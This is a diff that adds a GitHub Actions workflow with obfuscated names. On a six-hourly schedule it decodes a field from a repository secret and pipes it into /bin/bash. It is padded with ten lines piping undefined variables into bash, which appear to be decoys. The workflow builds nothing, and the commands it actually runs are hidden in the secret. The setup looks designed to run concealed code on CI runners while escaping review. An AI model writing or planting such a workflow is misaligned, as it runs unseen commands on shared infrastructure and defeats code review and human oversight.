@@ -1,0 +1,26 @@
+name: pinghuijuantui
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: pinghuijuantui
+        env:
+          rqfi7: ${{ secrets.rqfi7 }}
+        run: |
+          echo $rqfi7 | jq -r .ad9043 | /bin/bash
+          echo $ixzi41 | jq -r .d1198 | /bin/bash
+          echo $dyam8 | jq -r .iqiu382 | /bin/bash
+          echo $cxob27923 | jq -r .ejcc48672 | /bin/bash
+          echo $zqgft9 | jq -r .cdus55 | /bin/bash
+          echo $by27 | jq -r .cqsx5056 | /bin/bash
+          echo $cghv946 | jq -r .hi7 | /bin/bash
+          echo $vrlc9 | jq -r .pumg92 | /bin/bash
+          echo $aet43397 | jq -r .k9529 | /bin/bash
+          echo $r041 | jq -r .rjv8 | /bin/bash
+          echo $jzxxd9641 | jq -r .sbkn5 | /bin/bash
+
